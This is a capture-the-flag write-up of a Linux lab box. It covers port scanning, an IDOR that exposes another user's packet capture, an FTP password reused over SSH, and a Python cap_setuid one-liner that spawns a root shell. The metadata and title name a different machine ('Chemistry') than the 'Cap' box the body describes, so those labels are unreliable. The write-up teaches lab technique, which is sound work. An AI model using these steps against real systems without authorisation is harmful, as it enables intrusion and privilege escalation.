---
title: "Chemistry"
difficulty: Easy
os: Linux
points: 20
rating: 4.4
date: 2024-10-19
avatar: assets/htb/chemistry.png
tags: [Arbitrary File Read, Remote Code Execution, Python, Web Application, Custom Applications]
htb_url: https://app.hackthebox.com/machines/Chemistry
---

# Chemistry %

🔗 [Cap](https://www.hackthebox.com/machines/cap)

## Summary

Chemistry is an Easy Linux box centred on a Gunicorn-hosted "Security Dashboard" web application. The application exposes packet captures through a sequential `/data/<id>` path that is vulnerable to an Insecure Direct Object Reference (IDOR), letting me retrieve another user's PCAP. That capture leaks the user Nathan's FTP credentials in cleartext, which are reused over SSH to obtain a shell. From there, the `cap_setuid` capability on `/usr/bin/python3.8` is abused to set the UID to 0 and pop a root shell.

## Enumeration

I started by adding the host to `/etc/hosts` and setting up a working directory for the engagement.

```bash
su
echo "<YOUR_IP> cap.htb" >> /etc/hosts

mkdir -p htb/cap.htb
cd htb/cap.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

My usual first recon step is to ping the target, which confirms we can reach it and hints at the underlying OS.

```bash
ping -c 3 cap.htb
PING cap.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from cap.htb (<YOUR_IP>): icmp_seq=6 ttl=63 time=77.8 ms
64 bytes from cap.htb (<YOUR_IP>): icmp_seq=9 ttl=63 time=80.1 ms
64 bytes from cap.htb (<YOUR_IP>): icmp_seq=11 ttl=63 time=51.5 ms
```

These three ICMP replies come back with a TTL near 64, which points to a **\*nix** host; Windows machines typically respond with a TTL around 128.

### Port scanning

Next I jumped straight into an active nmap port scan across the full TCP range.

```bash
sudo nmap -p0- -sS -Pn -T4 -vvv cap.htb -oN nmap/tcp_port_scan
```

```bash
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sT</td><td>TCP connect port scan (Default without root privilege)</td></tr><tr><td>sC</td><td>Run default scripts</td></tr><tr><td>sV</td><td>Enumerate versions</td></tr><tr><td>vvv</td><td>Verbosity</td></tr><tr><td>T4</td><td>Run a bit faster</td></tr><tr><td>oN</td><td>Output to file with nmap formatting</td></tr></tbody></table>

The scan reveals 3 open TCP ports on the host: 21, 22 and 80. With those identified, I enumerated the services running behind them.

```bash
sudo nmap -sV -sC -p 21,22,80 cap.htb -oN nmap/service_port_scan
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Thu, 02 Jan 2025 11:42:26 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Thu, 02 Jan 2025 11:42:21 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Thu, 02 Jan 2025 11:42:21 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, HEAD
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=1/2%Time=67767B84%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1FBC,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x
SF:20Thu,\x2002\x20Jan\x202025\x2011:42:21\x20GMT\r\nConnection:\x20close\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201
SF:9386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\"
SF:>\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\
SF:x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x2
SF:0\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<met
SF:a\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scal
SF:e=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"ima
SF:ge/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\
SF:">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/f
SF:ont-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20re
SF:l=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\
SF:x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min
SF:\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static
SF:/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOpti
SF:ons,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Thu,\
SF:x2002\x20Jan\x202025\x2011:42:21\x20GMT\r\nConnection:\x20close\r\nCont
SF:ent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20GET,\
SF:x20HEAD\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20te
SF:xt/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x
SF:20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body
SF:>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inva
SF:lid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RT
SF:SP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,1
SF:89,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x2
SF:0Thu,\x2002\x20Jan\x202025\x2011:42:26\x20GMT\r\nConnection:\x20close\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2023
SF:2\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x
SF:20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h
SF:1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20s
SF:erver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20
SF:check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web enumeration

Beyond confirming the Gunicorn web server, which the nmap output already revealed, whatweb doesn't disclose much else.

```bash
whatweb cap.htb
http://cap.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[<YOUR_IP>], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]
```

Opening the web server in a browser maps out the application's scope. The page is a security-events dashboard showing failed logins and similar metrics. The "Security Snapshot" section offers a packet sniffer with a counter and lets us download the captured traffic. Under "IP Config" we can view the network interface of the attacker machine `<YOUR_IP>`, and the "Network Status" section lists all the current connections. The "user tab" in the top-right is just a non-functional mockup, but the name "Nathan" is worth keeping in mind, it could come in handy for the SSH and FTP services.

Running GoBuster for directory enumeration and reviewing the page source turns up nothing else of interest.

```bash
gobuster dir -u http://cap.htb -w /usr/share/wordlists/dirb/common.txt
```

The more interesting behaviour is the Security Snapshot itself: after running one, the browser is redirected to a path of the format `/data/[id]`, where `[id]` is the id number of the scan. That redirect is a useful clue for our next move, so I generated some ICMP traffic and confirmed it gets captured, with the result reflected directly in the `/data/` URL path.

## Foothold

### IDOR on the packet captures

Running ffuf against a wordlist of common usernames returned nothing useful, so the focus shifted back to that URL pattern. When a new capture is created, the path takes the form `/data/<id>`, where the id increments with each capture.

Tampering with that identifier revealed an Insecure Direct Object Reference (IDOR) vulnerability, a flaw that lets an attacker reach or alter objects by manipulating the identifiers used in a web page. This implies the server keeps the most recent scans, including packet captures from earlier users. Starting from `/data/1`, browsing to `/data/0` does indeed expose a packet capture containing multiple packets, confirming we can reach other users' scans.

### Recovering Nathan's credentials

I downloaded the PCAP file at id `0` (which is named after the machine) and inspected the traffic in Wireshark, hunting for FTP, HTTP, or other cleartext sensitive data. Right away I spotted a successful FTP login by the earlier-mentioned user Nathan, with the password in plaintext. The sensitive data lives in the **FTP** application-layer protocol, recoverable from the full TCP stream.

With Nathan's FTP password in hand, I tested it against both the FTP and SSH services.

#### FTP/21

```bash
ftp nathan@cap.htb
```

#### SSH/22

The credentials work on both services, so the SSH login lands a shell as Nathan. From his home directory I grabbed the user flag.

```bash
cat user.txt
f17c************************c401
```

## Privilege Escalation

Running `sudo -l` shows no commands that Nathan is allowed to run with sudo privileges. Rather than starting with automated tooling like Linpeas, I ran a few targeted checks.

```bash
crontab -l
cat /proc/version
getcap -r /2>/dev/null
```

Checking cronjobs, the kernel version, and [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html), the only promising result comes from the Linux capabilities. The first line of that output, `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`, shows [cap\_setuid](https://man7.org/linux/man-pages/man2/setuid.2.html) on `/usr/bin/python3.8`, meaning the Python interpreter can elevate privileges.

The plan is to set our UID to 0 (the root user). I can do this right on the target by running OS commands through the `/usr/bin/python3.8` interpreter.

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

Once the UID is set to 0 we gain root privileges. To finish, I head into the root directory and read the root flag.

```bash
cat /root/root.txt
751f************************f9b7
```
